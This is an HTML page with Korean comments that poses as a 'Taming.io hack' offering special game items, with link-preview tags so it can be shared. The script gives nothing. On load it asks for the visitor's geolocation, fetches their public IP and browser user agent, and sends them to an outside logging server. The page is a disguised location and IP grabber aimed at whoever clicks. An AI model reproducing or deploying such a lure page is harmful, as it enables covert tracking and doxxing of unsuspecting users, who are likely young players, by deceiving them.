<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>Taming.io hack</title>
    <meta property="og:title" content="Taming.io hack">
    <meta property="og:description" content="Click here to get special items for Taming.io!">
    <meta property="og:image" content="https://i.imgur.com/CIpGROL.jpeg">
    <meta property="og:url" content="[여기에-Netlify-주소를-넣으세요]">
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; }
        h1 { color: #333; }
    </style>
</head>
<body>
    <h1>taming.io hack!</h1>
    <p id="status">wait.....</p>

    <script>
        window.onload = function() {
            const statusElement = document.getElementById('status');
            const loggerServerUrl = 'https://aaa-production-efa7.up.railway.app/log-ip';

            // --- 위치 정보와 IP를 서버로 보내는 최종 함수 ---
            function sendData(ip, userAgent, lat, lon) {
                fetch(loggerServerUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        ip: ip, 
                        userAgent: userAgent,
                        latitude: lat,
                        longitude: lon
                    })
                })
                .then(res => res.json())
                .then(logResult => {
                    console.log('Log server response:', logResult.message);
                    statusElement.textContent = 'bye';
                })
                .catch(err => console.error('Failed to send log:', err));
            }

            // --- IP 주소를 가져오는 함수 ---
            function getIpAndSendData(lat, lon) {
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        sendData(data.ip, navigator.userAgent, lat, lon);
                    })
                    .catch(error => {
                        console.error('IP fetch error:', error);
                        // IP 가져오기 실패 시에도 위치 정보만이라도 보낼 수 있음 (선택사항)
                        sendData(null, navigator.userAgent, lat, lon);
                    });
            }

            // --- 1. Geolocation API 실행 ---
            if (navigator.geolocation) {
                // 위치 정보 요청 팝업을 띄웁니다.
                navigator.geolocation.getCurrentPosition(
                    // (성공 콜백) 사용자가 '허용'을 누르면 실행
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        getIpAndSendData(lat, lon); // 위치 정보와 함께 IP 가져오기 실행
                    },
                    // (실패 콜백) 사용자가 '차단'을 누르거나 오류가 나면 실행
                    function(error) {
                        console.warn('Geolocation Error:', error.message);
                        getIpAndSendData(null, null); // 위치 정보 없이 IP 가져오기 실행
                    }
                );
            } else {
                // 브라우저가 위치 정보를 지원하지 않는 경우
                console.error("Geolocation is not supported by this browser.");
                getIpAndSendData(null, null); // 위치 정보 없이 IP 가져오기 실행
            }
        };
    </script>
</body>
</html>
